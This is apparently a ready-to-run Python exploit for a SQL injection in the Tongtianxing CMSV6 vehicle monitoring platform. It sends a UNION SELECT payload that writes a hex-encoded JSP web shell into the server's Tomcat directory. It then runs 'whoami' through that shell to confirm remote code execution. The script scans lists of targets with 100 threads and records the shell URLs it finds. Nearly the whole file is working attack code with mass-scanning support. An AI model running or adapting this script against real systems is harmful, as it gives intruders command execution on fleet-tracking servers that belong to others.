#通天星CMSV6车载定位监控平台 point_manage/merge SQL注入致RCE漏洞  TTX_CMSV6_sqltorce.py
#2024年5月，通天星CMSV6发布新版本修复了一处SQL注入漏洞。漏洞是由于通天星CMSV6车载定位监控平台末对用户的输入进行预编译，直接将其拼接进了SQL查询语句中，导致系统出现SQL注入漏洞。该漏洞可通过SQL注入实现文件写入进行远程代码执行，获取服务器权限。
#通天星CMSV6车载定位监控平台<7.33.0.7_20240508
#body="/808gps/" 
import requests,re,argparse,sys,time,os
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()# 解除警告
from colorama import Fore, Style
BLUE = Fore.BLUE
RESET = Style.RESET_ALL
def banner():
    banner ="""

 ▄▄▄     ▄▄▄█████▓▄▄▄█████▓ ▄▄▄       ▄████▄   ██ ▄█▀    ███▄    █  ▒█████   █     █░ ▐██▌ 
▒████▄   ▓  ██▒ ▓▒▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█   ██▄█▒     ██ ▀█   █ ▒██▒  ██▒▓█░ █ ░█░ ▐██▌ 
▒██  ▀█▄ ▒ ▓██░ ▒░▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░    ▓██  ▀█ ██▒▒██░  ██▒▒█░ █ ░█  ▐██▌ 
░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄    ▓██▒  ▐▌██▒▒██   ██░░█░ █ ░█  ▓██▒ 
 ▓█   ▓██▒ ▒██▒ ░   ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄   ▒██░   ▓██░░ ████▓▒░░░██▒██▓  ▒▄▄  
 ▒▒   ▓▒█░ ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒   ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒   ░▀▀▒ 
  ▒   ▒▒ ░   ░        ░      ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░   ░ ░░   ░ ▒░  ░ ▒ ▒░   ▒ ░ ░   ░  ░ 
  ░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░       ░   ░ ░ ░ ░ ░ ▒    ░   ░      ░ 
      ░  ░                       ░  ░░ ░      ░  ░               ░     ░ ░      ░     ░    
                                    author:           🐖sawa🐇
                                    version:          1.0.0
                                    For:              通天星CMSV6车载定位监控平台SQL注入致RCE漏洞░                                                     
"""
    print(banner)
def main():
    banner()
    parser = argparse.ArgumentParser(description="通天星CMSV6车载定位监控平台SQL注入致RCE漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','-file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")# print("Usage:\n\t python3 {} -h".format(sys.argv[0]))

def poc(target):
    payload_url = '/point_manage/merge'
    url = target+payload_url
    url1 = target+'/rce.jsp?cmd=whoami'
    headers = {
        'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.2882.93 Safari/537.36',
        'Content-Type':'application/x-www-form-urlencoded',
        }
    data = "id=1&name=1' UNION SELECT%0aNULL, 0x3c25206a6176612e696f2e496e70757453747265616d20696e203d2052756e74696d652e67657452756e74696d6528292e6578656328726571756573742e676574506172616d657465722822636d642229292e676574496e70757453747265616d28293b696e742061203d202d313b627974655b5d2062203d206e657720627974655b323034385d3b6f75742e7072696e7428223c7072653e22293b7768696c652828613d696e2e7265616428622929213d2d31297b6f75742e7072696e746c6e286e657720537472696e6728622c302c6129293b7d6f75742e7072696e7428223c2f7072653e22293b6e6577206a6176612e696f2e46696c65286170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574536572766c657450617468282929292e64656c65746528293b253e,NULL,NULL,NULL,NULL,NULL,NULL INTO dumpfile '../../tomcat/webapps/gpsweb/rce.jsp' FROM user_session a WHERE '1 '='1 &type=3&map_id=4&install_place=5&check_item=6&create_time=7&update_time=8"
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=5)
        res1 = requests.get(url=url1,verify=False,timeout=5)
        if res.status_code == 200 and res1.status_code == 200:
            print(f"{BLUE}[+]该{target}存在漏洞,访问验证:{url1}{RESET}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(url1+"\n")
                return True
        else:
            print(f"[-]该{target}不存在漏洞")
            return False
    except Exception as e:
        print(f"[*]该url存在问题{target}"+str(e))
        return False

if __name__ == '__main__':
    main()
